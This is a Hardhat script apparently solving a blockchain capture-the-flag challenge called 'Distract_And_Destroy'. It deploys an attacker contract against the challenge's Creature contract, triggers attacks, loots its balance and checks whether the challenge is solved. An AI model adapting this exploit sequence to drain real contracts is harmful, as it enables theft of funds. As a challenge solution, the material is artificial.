const hre = require("hardhat");
const { ethers, JsonRpcProvider } = require("ethers");

async function main() {

    const [deployer] = await hre.ethers.getSigners();

    const SETUP_ADDRESS = "0xDAaC56A930a3beAF240894CA5a3Ca41Bd9688248";

    // Get the contract instances
    const Setup = await hre.ethers.getContractFactory("contracts/Distract_And_Destroy/Setup.sol:Setup");
    const setupInstance = Setup.attach(SETUP_ADDRESS);

    // Interact with the Setup contract
    const targetAddress = await setupInstance.TARGET();
    console.log(`Target Creature Address: ${targetAddress}`);

    // Assuming Creature ABI is available
    const Creature = await hre.ethers.getContractFactory("contracts/Distract_And_Destroy/Creature.sol:Creature");
    const creatureInstance = Creature.attach(targetAddress);

    console.log(await creatureInstance.getAddress());
    //Attacker contract
    const AttackerContract = await hre.ethers.getContractFactory("contracts/Distract_And_Destroy/Solution/AttackContract.sol:AttackContract");
    const attackerContractInstance = await AttackerContract.deploy(await creatureInstance.getAddress());

    // Deal damage and loot
    console.log(await creatureInstance.lifePoints());
    await creatureInstance.attack(20);
    await attackerContractInstance.attack();
    await creatureInstance.loot();

    // const solved = await setupInstance.isSolved();
     //console.log(solved)

     console.log(`Balance of Creature after attack: ${await hre.ethers.provider.getBalance(targetAddress)}`);
     console.log(`Balance of Creature after attack: ${await setupInstance.isSolved()}`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });